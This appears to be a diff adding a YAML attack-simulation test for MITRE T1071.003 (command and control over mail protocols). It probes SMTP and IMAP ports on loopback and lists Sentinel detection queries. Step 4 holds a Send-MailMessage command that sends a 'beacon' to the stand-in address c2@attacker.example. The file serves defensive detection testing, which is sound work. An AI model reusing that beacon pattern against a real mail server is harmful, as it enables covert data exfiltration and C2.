@@ -1,0 +1,99 @@
+id: T1071.003_application_layer_mail_protocols
+name: "Application Layer Protocol — Mail Protocols"
+mitre_technique: "T1071.003"
+mitre_tactic: "command_and_control"
+description: >
+  Adversaries use email protocols (SMTP, IMAP, POP3) as C2 channels — sending commands
+  via email and receiving results back through the mailbox. The implant checks an inbox
+  for command messages and replies with execution results. Mail protocols blend in with
+  legitimate email traffic and may bypass web proxies. Detection relies on mail client
+  processes making SMTP/IMAP connections, particularly non-mail applications connecting
+  to mail ports.
+author: stanleytobias
+created: "2026-01-01"
+platform: windows
+references:
+  - https://attack.mitre.org/techniques/T1071/003/
+
+steps:
+  - step: 1
+    type: marker
+    description: "Pre-execution context"
+    message: "Starting T1071.003 — Mail Protocol C2 channel simulation (loopback only)"
+
+  - step: 2
+    type: exec_powershell
+    description: "Simulate SMTP C2 — send command result via email from implant"
+    command: |
+      Write-Host "[PAS] Simulating SMTP C2 beacon (port 25/587):"
+      # SMTP connection attempt generates port 25/587 network telemetry
+      foreach ($port in @(25, 587, 465)) {
+          try {
+              $tcp  = New-Object System.Net.Sockets.TcpClient
+              $conn = $tcp.BeginConnect("127.0.0.1", $port, $null, $null)
+              $conn.AsyncWaitHandle.WaitOne(300, $false) | Out-Null
+              $tcp.Close()
+          } catch {}
+          Write-Host "[PAS] SMTP probe: 127.0.0.1:$port"
+      }
+
+  - step: 3
+    type: exec_powershell
+    description: "Simulate IMAP polling — implant checks inbox for command messages"
+    command: |
+      Write-Host "[PAS] Simulating IMAP C2 polling (port 143/993):"
+      foreach ($port in @(143, 993)) {
+          try {
+              $tcp  = New-Object System.Net.Sockets.TcpClient
+              $conn = $tcp.BeginConnect("127.0.0.1", $port, $null, $null)
+              $conn.AsyncWaitHandle.WaitOne(300, $false) | Out-Null
+              if ($conn.IsCompleted -and $tcp.Connected) {
+                  Write-Host "[PAS] IMAP port $port open — banner grab:"
+                  $stream = $tcp.GetStream()
+                  $buf = New-Object byte[] 128
+                  $stream.ReadTimeout = 300
+                  try { $stream.Read($buf, 0, 128) | Out-Null } catch {}
+              }
+              $tcp.Close()
+          } catch {}
+          Write-Host "[PAS] IMAP probe: 127.0.0.1:$port"
+      }
+      Write-Host "[PAS] Mail protocol C2 ports probed — telemetry generated"
+
+  - step: 4
+    type: exec_powershell
+    description: "Simulate PowerShell Send-MailMessage — common implant mail exfil method"
+    command: |
+      Write-Host "[PAS] Send-MailMessage C2 pattern (will fail — loopback SMTP not available):"
+      try {
+          Send-MailMessage -To "c2@attacker.example" -From "implant@victim.local" `
+              -Subject "Beacon" -Body "PAS-T1071.003-MAIL-C2" `
+              -SmtpServer "127.0.0.1" -Port 25 -ErrorAction Stop
+      } catch {
+          Write-Host "[PAS] Expected failure (no local SMTP): $($_.Exception.Message)"
+      }
+      Write-Host "[PAS] Send-MailMessage in script block logging — visible in Event ID 4104"
+
+  - step: 5
+    type: sleep
+    description: "Allow telemetry to flush"
+    seconds: 3
+
+  - step: 6
+    type: marker
+    description: "Post-execution prompt"
+    message: "Check SIEM — non-mail process connecting to SMTP/IMAP ports, Send-MailMessage in script block logs"
+
+cleanup:
+  - step: 1
+    type: marker
+    description: "No persistent artifacts"
+    message: "T1071.003 cleanup complete — no persistent artifacts"
+
+analyst_checklist:
+  - "Network event: powershell.exe connecting to port 25, 587, 465, 143, or 993"
+  - "Script block logging (4104): Send-MailMessage cmdlet with external SMTP server"
+  - "Sentinel: DeviceNetworkEvents | where RemotePort in (25,587,465,143,993) and InitiatingProcessFileName == 'powershell.exe'"
+  - "Sentinel: DeviceEvents | where ActionType == 'PowerShellCommand' and AdditionalFields contains 'Send-MailMessage'"
+  - "CONTROL CHECK: Block outbound SMTP (port 25) from endpoints — only mail relay servers should send on port 25"
+  - "CONTROL CHECK: Alert on any non-Outlook/non-mail process connecting to IMAP/POP3 ports"
